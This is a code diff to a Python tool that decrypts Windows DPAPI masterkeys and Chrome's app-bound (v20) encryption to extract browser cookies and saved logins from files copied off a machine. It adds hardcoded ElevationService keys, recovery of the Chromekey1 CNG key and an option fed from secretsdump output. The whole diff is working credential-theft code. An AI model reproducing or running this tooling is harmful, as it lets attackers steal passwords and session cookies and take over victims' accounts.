@@ -38,7 +38,7 @@ import zlib
 from pathlib import Path
 
 from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
-from cryptography.hazmat.primitives.ciphers.aead import AESGCM
+from cryptography.hazmat.primitives.ciphers.aead import AESGCM, ChaCha20Poly1305
 
 # --- theme ------------------------------------------------------------------
 
@@ -231,6 +231,7 @@ class Blob:
 
     def _cng(self, data):
         try:
+            self._blob_start = 20
             cur = 44
             (desc_len,) = struct.unpack("<L", data[cur:cur + 4])
             cur += 4 + desc_len
@@ -254,15 +255,16 @@ class Blob:
                 return value
 
             self.salt = take()
-            self.hmac_key = take()          # empty in this layout
+            self.strong = take()
             self.hash_alg = word()
             if self.hash_alg not in ALG:
                 return False
             word()                          # hash size in bits
-            self.hmac_key = take()
-            self.tag = take()
-            self.data = take()
-            return cur == len(data) and bool(self.salt) and bool(self.data)
+            self.hmac = take()
+            self.ciphertext = take()
+            self.blob = data[self._blob_start:cur]
+            self.sign = take()
+            return cur == len(data) and bool(self.salt) and bool(self.ciphertext)
         except (struct.error, ValueError):
             self.salt = self.hmac_key = self.tag = self.data = b""
             return False
@@ -289,40 +291,68 @@ class Blob:
             return value
 
         self.salt = take()
-        self.hmac_key = take()
+        self.strong = take()
         self.hash_alg = word()
         if self.hash_alg not in ALG:
             return False
-        if alg_strings:
-            self.alg_id = take()
-        else:
-            word()
-        self.tag = take()
-        self.data = take()
-        return cur == len(data) and bool(self.salt) and bool(self.data)
+        word()                          # hash size in bits
+        self.hmac = take()
+        self.ciphertext = take()
+        self.blob = data[getattr(self, "_blob_start", 20):cur]
+        self.sign = take() if cur < len(data) else b""
+        return cur == len(data) and bool(self.salt) and bool(self.ciphertext)
 
     def guid_text(self):
         d1, d2, d3 = struct.unpack("<LHH", self.guid[:8])
         tail = self.guid[8:].hex()
         return f"{d1:08x}-{d2:04x}-{d3:04x}-{tail[:4]}-{tail[4:]}"
 
-    def decrypt(self, masterkey):
+    def _session(self, key_hash, digest, block, nonce, entropy, verif):
+        # Type 1: Microsoft's faulty HMAC (outer pad carries the data).
+        padded = key_hash + b"\0" * block
+        pad1 = bytes(b ^ 0x36 for b in padded[:block])
+        pad2 = bytes(b ^ 0x5C for b in padded[:block])
+        outer = hashlib.new(digest, pad2)
+        inner = hashlib.new(digest, pad1)
+        inner.update(nonce)
+        if entropy:
+            inner.update(entropy)
+        outer.update(inner.digest())
+        if entropy:
+            outer.update(entropy)
+        if verif is not None:
+            outer.update(verif)
+        return outer.digest()
+
+    def decrypt(self, masterkey, entropy=None):
         digest = hash_name(self.hash_alg)
         block = ALG[self.hash_alg][2]
         key_hash = masterkey if len(masterkey) == 20 else hashlib.sha1(masterkey).digest()
-        session = hmac.new(key_hash, self.salt, digest).digest()
-        if len(session) > block:
-            session = hmac.new(session, digestmod=digest).digest()
-        material = session
-        if len(material) < ALG[self.crypt_alg][0]:
-            material += b"\0" * block
-            ipad = bytes(b ^ 0x36 for b in material[:block])
-            opad = bytes(b ^ 0x5C for b in material[:block])
-            material = (hashlib.new(digest, ipad).digest()
-                        + hashlib.new(digest, opad).digest())
-            material = _des_parity(material)
-        plain = cbc_decrypt(material[: ALG[self.crypt_alg][0]], b"\0" * ALG[self.crypt_alg][2], self.data)
-        return unpad(plain)
+        type2 = hmac.new(key_hash, digestmod=digest)
+        type2.update(self.hmac)
+        if entropy:
+            type2.update(entropy)
+        type2.update(self.blob)
+        expected = {type2.digest(), self._session(key_hash, digest, block, self.hmac,
+                                                  entropy, self.blob)}
+        for session in (self._session(key_hash, digest, block, self.salt, entropy, None),
+                        hmac.new(key_hash, self.salt + (entropy or b""), digest).digest()):
+            material = session
+            if len(material) < ALG[self.crypt_alg][0]:
+                material += b"\0" * block
+                ipad = bytes(b ^ 0x36 for b in material[:block])
+                opad = bytes(b ^ 0x5C for b in material[:block])
+                material = (hashlib.new(digest, ipad).digest()
+                            + hashlib.new(digest, opad).digest())
+                material = _des_parity(material)
+            plain = cbc_decrypt(material[: ALG[self.crypt_alg][0]],
+                                b"\0" * ALG[self.crypt_alg][2], self.ciphertext)
+            plain = unpad(plain)
+            if not self.sign:
+                return plain
+            if self.sign in expected:
+                return plain
+        raise ValueError("DPAPI HMAC mismatch")
 
 
 def masterkey_decrypt(path, secret):
@@ -408,7 +438,12 @@ def load_masterkeys(folder, secret, is_system=False):
     keys = {}
     if folder is None or not folder.is_dir():
         return keys
-    material = secret if is_system else hashlib.sha1(secret.encode("utf-16le")).digest()
+    if is_system:
+        material = secret
+    else:
+        # Windows DPAPI: SHA1(password UTF-16LE) then a SID-bound HMAC.
+        pwd = hashlib.sha1(secret.encode("utf-16le")).digest()
+        material = hmac.new(pwd, (folder.name + "\0").encode("utf-16le"), hashlib.sha1).digest()
     for blob_file in sorted(folder.iterdir()):
         if not blob_file.is_file() or blob_file.name == "Preferred":
             continue
@@ -419,15 +454,15 @@ def load_masterkeys(folder, secret, is_system=False):
     return keys
 
 
-def unprotect(blob_bytes, keyring, fallback=True):
+def unprotect(blob_bytes, keyring, fallback=True, entropy=None):
     blob = Blob(blob_bytes)
     key = keyring.get(blob.guid_text().lower())
     if key is not None:
-        return blob.decrypt(key)
+        return blob.decrypt(key, entropy)
     if fallback:
         for candidate in keyring.values():
             try:
-                return blob.decrypt(candidate)
+                return blob.decrypt(candidate, entropy)
             except Exception:
                 continue
     raise ValueError("no masterkey for blob")
@@ -458,25 +493,89 @@ def unlock_local_state(keys_file, state_file, keyring):
     return None
 
 
+APPB_HEADER = b"APPB"
+ABE_FLAG1_KEY = bytes.fromhex("B31C6E241AC846728DA9C1FAC4936651CFFB944D143AB816276BCC6DA0284787")
+ABE_FLAG2_KEY = bytes.fromhex("E98F37D7F4E1FA433D19304DC2258042090E2D1D7EEA7670D41F738D08729660")
+ABE_FLAG3_XOR = bytes.fromhex("CCF8A1CEC56605B8517552BA1A2D061C03A29E90274FB2FCF59BA4B75C392390")
+ABE_FLAG4_XOR = bytes.fromhex("208A6DA7114A44E6B463114BD9DA397E939ADEFEDBF4588117926B0F2C503158")
+KSP_ENTROPY = b"xT5rZW5qVVbrvpuA\x00"
+_KSP_KEY = b""
+
+
+def set_ksp_key(path):
+    """Load Google Chromekey1 and unwrap it with the imported SYSTEM masterkey."""
+    global _KSP_KEY
+    _KSP_KEY = b""
+    if path is None:
+        return
+    raw = Path(path).read_bytes()
+    start = raw.rfind(APP_SIG)
+    if start < 0:
+        raise ValueError("KSP file has no DPAPI blob")
+    blob = Blob(raw[start:])
+    plain = unprotect(blob, _SYSTEM_KEYS, fallback=False, entropy=KSP_ENTROPY)
+    # BCRYPT_KEY_DATA_BLOB: magic "KDBM" | version | cbKeyData | key
+    if len(plain) >= 12 and plain[:4] == b"KDBM":
+        size = struct.unpack("<L", plain[8:12])[0]
+        _KSP_KEY = plain[12:12 + size]
+    else:
+        _KSP_KEY = plain[:32]
+
+
+_SYSTEM_KEYS = {}
+
+
+def _abe_derive(content):
+    """ElevationService ciphertext -> v20 AES key."""
+    if len(content) == 32:
+        return content
+    if not content:
+        return b""
+    flag = content[0]
+    if flag in (1, 2):
+        iv, tag, ct = content[1:13], content[13:29], content[29:]
+        if flag == 1:
+            return AESGCM(ABE_FLAG1_KEY).decrypt(iv, ct + tag, None)
+        return ChaCha20Poly1305(ABE_FLAG2_KEY).decrypt(iv, ct + tag, None)
+    if flag in (3, 4):
+        if not _KSP_KEY:
+            raise ValueError(f"flag {flag} needs --ksp (Google Chromekey1)")
+        xor = ABE_FLAG3_XOR if flag == 3 else ABE_FLAG4_XOR
+        enc_key, iv, ct, tag = content[1:33], content[33:45], content[45:77], content[77:93]
+        dec = Cipher(algorithms.AES(_KSP_KEY), modes.CBC(b"\0" * 16)).decryptor()
+        key = bytes(x ^ y for x, y in zip(dec.update(enc_key) + dec.finalize(), xor))
+        return AESGCM(key).decrypt(iv, ct + tag, None)
+    raise ValueError(f"unknown app-bound content flag {flag}")
+
+
 def unwrap_app_bound(value, system_keys, user_keys):
-    """APPB blob -> candidate AES keys (SYSTEM layer, optional user layer)."""
+    """APPB blob1 (SYSTEM) -> blob2 (user) -> ElevationService envelope -> key."""
     raw = decode_wrapped(value)
-    if raw[:4] != b"APPB":
+    if raw[:4] != APPB_HEADER:
         return []
-    plain = unprotect(raw[4:], system_keys)
-    inner = []
-    start = plain.find(APP_SIG)
-    while 0 <= start < 64:
-        try:
-            inner.append(unprotect(plain[start:], user_keys))
-        except Exception:
-            pass
-        start = plain.find(APP_SIG, start + 1)
-    if inner:
-        return inner
-    if len(plain) >= 32:
-        return [plain[:32]]
-    return []
+    blob1 = Blob(raw[4:])
+    key1 = system_keys.get(blob1.guid_text().lower())
+    if key1 is None:
+        raise ValueError("no SYSTEM masterkey for blob1")
+    plain1 = blob1.decrypt(key1)
+    if plain1[:12] == APP_SIG:
+        blob2 = Blob(plain1)
+        key2 = user_keys.get(blob2.guid_text().lower())
+        if key2 is None:
+            raise ValueError("no user masterkey for blob2")
+        plain2 = blob2.decrypt(key2)
+    else:
+        plain2 = plain1
+    if len(plain2) < 8:
+        raise ValueError("truncated app-bound envelope")
+    header_len = struct.unpack("<L", plain2[:4])[0]
+    at = 4 + header_len
+    if at + 4 > len(plain2):
+        raise ValueError("truncated app-bound envelope")
+    content_len = struct.unpack("<L", plain2[at:at + 4])[0]
+    content = plain2[at + 4:at + 4 + content_len]
+    key = _abe_derive(content)
+    return [key] if key else []
 
 
 # --- cookies / logins -------------------------------------------------------
@@ -1038,17 +1137,39 @@ def main():
         skipped("dpapi: no masterkey", "optional for legacy blobs")
     if args.system_masterkey:
         system_keys["*"] = bytes.fromhex(args.system_masterkey)
+        _SYSTEM_KEYS.clear()
+        _SYSTEM_KEYS.update(system_keys)
         ok("dpapi: SYSTEM masterkey supplied")
     if args.machinekey:
         folder = (Path(args.system_protect) if args.system_protect
                   else root / "dpapi" / "Protect" / "S-1-5-18")
         if (folder / "S-1-5-18").is_dir():
             folder = folder / "S-1-5-18"
-        system_keys.update(load_masterkeys(folder, bytes.fromhex(args.machinekey), True))
+        material = bytes.fromhex(args.machinekey)
+        system_keys.update(load_masterkeys(folder, material, True))
+        if args.system_userkey:
+            system_keys.update(load_masterkeys(folder / "User",
+                                               bytes.fromhex(args.system_userkey), True))
+        _SYSTEM_KEYS.clear()
+        _SYSTEM_KEYS.update(system_keys)
         if system_keys:
             ok("dpapi: SYSTEM masterkeys recovered", str(len(system_keys)))
         else:
             warn("dpapi: machinekey did not open any S-1-5-18 masterkey", str(folder))
+    ksp = args.ksp
+    if not ksp:
+        for candidate in (root / "hives" / "SystemKeys", root / "SystemKeys"):
+            if candidate.is_dir():
+                for path in candidate.iterdir():
+                    if path.is_file() and "chromekey" in path.name.lower():
+                        ksp = str(path)
+                        break
+            if ksp:
+                break
+    if ksp:
+        set_ksp_key(ksp)
+        if _KSP_KEY:
+            ok("dpapi: KSP Chromekey1 recovered", str(len(_KSP_KEY)))
 
     total = 7
     step(1, total, "browsers")
@@ -1128,6 +1249,11 @@ def parse_args():
                              "derives the S-1-5-18 masterkeys")
     parser.add_argument("--system-protect",
                         help="copied S-1-5-18 Protect folder (default: inside the harvest)")
+    parser.add_argument("--system-userkey",
+                        help="DPAPI_SYSTEM userkey from secretsdump (20 bytes hex); "
+                             "opens the S-1-5-18/User masterkeys")
+    parser.add_argument("--ksp",
+                        help="copied 'Google Chromekey1' CNG key (v20 offline, Chrome flag 3)")
     parser.add_argument("--list", action="store_true", help="inventory only, decrypt nothing")
     parser.add_argument("-s", "--show", type=int, default=4, help="secrets printed on screen")
     parser.add_argument("-q", "--quiet", action="store_true", help="do not prompt")
